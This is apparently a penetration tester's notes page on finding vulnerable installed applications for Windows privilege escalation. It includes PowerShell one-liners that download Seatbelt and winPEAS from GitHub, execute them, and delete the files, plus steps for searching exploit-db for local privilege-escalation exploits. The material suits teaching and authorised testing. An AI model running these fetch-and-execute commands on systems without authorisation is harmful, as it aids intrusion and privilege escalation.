<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>8. Installed Applications</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>8. Installed Applications</h1><br /><br /><strong>
      <h3>Installed Applications</h3>
    </strong><br />• Most privilege escalations relating to installed applications are based on misconfigurations we
    have already covered.<br />• Still, some privilege escalations results from things like buffer overflows, so knowing
    how to identify installed applications and known vulnerabilities is still important.<br /><br />0. Manually
    enumerate all running programs:<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;tasklist&nbsp;/v</div>
    </div><br /><br />1. Automatically enumerate nonstandard process<br /> ◇ Seatbelt: <a
      href="https://github.com/GhostPack/Seatbelt" target="_blank">https://github.com/GhostPack/Seatbelt</a> <br /> Precompiled
    binaries:<br /> - version 0.2.2 <a
      href="https://github.com/carlospolop/winPE/raw/master/binaries/seatbelt/SeatbeltNet4AnyCPU.exe" target="_blank">https://github.com/carlospolop/winPE/raw/master/binaries/seatbelt/SeatbeltNet4AnyCPU.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/winPE/raw/master/binaries/seatbelt/SeatbeltNet4AnyCPU.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\Seatbelt.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\Seatbelt.exe&nbsp;NonstandardProcesses&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Seatbelt.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1337-1.png" alt="images/1337-1.png" /></a><br /> - version 1.1.1 <a
      href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" target="_blank">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe</a>
    <br /> from version 1.0.0 &quot;NonstandardProcesses&quot; renamed to “Processes”<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\Seatbelt.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\Seatbelt.exe&nbsp;Processes&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Seatbelt.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1337-2.png" alt="images/1337-2.png" /></a> <br /> ◇ WinPEAS<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;procesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1337-3.png" alt="images/1337-3.png" /></a><br /><br />2. try to identify
    the version of the process found. <br /> We can try running the executable with /? or -h, as well as checking config
    or text files in the Program Files directory.<br /><br />3. Once we find an interesting process we can use <a
      href="https://www.exploit-db.com/" target="_blank">https://www.exploit-db.com/</a> to search for exploitz<br /> click on <span
      style="text-decoration:underline;">Filters</span>:<br /> ◇ Type: local<br /> ◇ Platform: Windows<br /> ◇ Check
    “Has App”<br /> ◇ Search: priv esc<br /> <a href=""><img src="images/1337-4.png"
        alt="images/1337-4.png" /></a><br /> Most the misconfiguration that we will find rely on the same
    misconfiguration that we have already covered before:<br /> <a
      href="oitation--Privilege_Escalation--Windows_Privilege_Escalation--2._Service_Exploits--Insecure_Service_Permissions_(weak_folder_permissions).html">weak
      folder permissions</a>, <a
      href="logy--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--2._Service_Exploits--Unquoted_Service_Paths.html">unquoted
      service path</a>, <a
      href="tation--Privilege_Escalation--Windows_Privilege_Escalation--2._Service_Exploits--Insecure_Service_Executables_(insecure_file_permissions).html">file
      permissions</a>, ...<br /><br /><br />Bibliography:<br />• <a
      href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes</a>
  </div>
</body>

</html>